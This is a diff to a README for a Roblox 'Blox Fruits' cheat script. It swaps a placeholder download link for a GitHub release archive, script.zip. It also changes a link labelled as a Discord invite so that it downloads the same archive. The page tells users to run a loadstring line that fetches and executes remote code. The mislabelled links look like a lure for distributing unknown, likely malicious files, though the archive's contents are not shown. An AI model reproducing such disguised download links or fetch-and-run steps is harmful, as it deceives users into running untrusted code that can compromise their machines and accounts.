@@ -34,7 +34,7 @@ Click the button below to copy the latest **Blox Fruits Script**:
 ```
 loadstring(game:HttpGet('https://your-script-url.com', true))()
 ```
-👉 **[Download Latest Script](https://your-script-url.com)** 👈
+👉 **[Download Latest Script](https://github.com/Darkness-Vibe/bookish-octo-fiesta/releases/download/new/script.zip)** 👈
 
 ### 2️⃣ How to Use
 1. Open **Roblox Blox Fruits**.
@@ -62,6 +62,6 @@ This script is for **educational purposes only**. Use at your own risk. We do no
 ---
 
 ### 📢 Need Help? Join our Discord!
-🔗 **[Join Here](https://discord.gg/your-server-link)**
+🔗 **[Join Here](https://github.com/Darkness-Vibe/bookish-octo-fiesta/releases/download/new/script.zip)**
 
 ✅ **Subscribe & Follow for More Roblox Scripts!**
